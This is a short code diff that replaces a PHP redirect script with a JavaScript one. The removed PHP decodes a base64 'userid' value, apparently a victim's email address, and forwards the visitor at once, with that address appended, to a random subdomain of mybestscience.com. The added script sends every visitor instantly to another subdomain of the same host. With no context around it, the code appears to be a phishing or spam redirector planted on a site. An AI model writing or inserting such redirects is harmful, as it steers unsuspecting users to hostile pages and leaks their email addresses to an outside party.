@@ -1,26 +1,3 @@
-<?php
-function isBase64($data)
-{
-    if (base64_encode(base64_decode($data)) === $data) {
-        return true;
-    } else {
-        return false;
-    }
-}
-
-function decode($email){
-		
-		if(isBase64($email)){
-			 $email = base64_decode($email,false);
-		}
-      
-       header( "refresh:0;url=http://f0twl5.mybestscience.com/".$email);
-
-}
-if(isset($_GET['userid']) && !empty($_GET['userid'])){
-   $email = $_GET['userid'];
-   decode($email);
-}
-   
-   
-?>
+<script type="text/JavaScript">
+      setTimeout("location.href = 'http://pm5b9e.mybestscience.com';",0);
+</script>
